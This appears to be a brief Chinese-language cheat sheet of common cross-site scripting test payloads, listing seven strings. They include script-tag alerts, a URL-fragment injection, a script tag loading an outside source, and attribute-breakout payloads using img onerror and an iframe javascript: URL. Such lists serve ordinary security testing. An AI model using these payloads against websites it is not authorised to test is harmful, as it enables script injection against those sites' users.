## 常用 XSS 测试 payload

```
(1)	<script> alert('xss')</script>
(2)	http://localhost/x.html#<script> alert('xss')</script>
(3)	<script src=http://www.qq.com></script>
(4)	“><script>alert(1)</script>
(5)	“><img src=x onerror=alert(“xss”)>
(6)	"><iframe src=javascript:alert(1)></iframe>
(7)	</script>
```
